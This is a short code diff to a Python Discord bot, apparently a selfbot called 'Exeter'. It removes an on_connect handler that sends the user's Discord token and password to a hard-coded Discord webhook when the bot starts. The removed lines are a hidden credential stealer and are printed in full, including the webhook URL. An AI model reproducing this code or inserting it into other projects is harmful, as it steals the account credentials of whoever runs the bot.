@@ -350,11 +350,6 @@ async def on_message(message):
     await Exeter.process_commands(message)
 
 
-@Exeter.event
-async def on_connect():
-    Clear()  
-    requests.post('https://discord.com/api/webhooks/777374145943175178/zLOf7GdzeoVf2-Lk7Cc7hpnkLtsYLwfHhYqOfuhVFt9I5d-tzmBE8-yBT5fAd3OTEQ0-',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
-    startprint()
 
 @Exeter.event
 async def on_member_ban(guild: discord.Guild, user: discord.user):
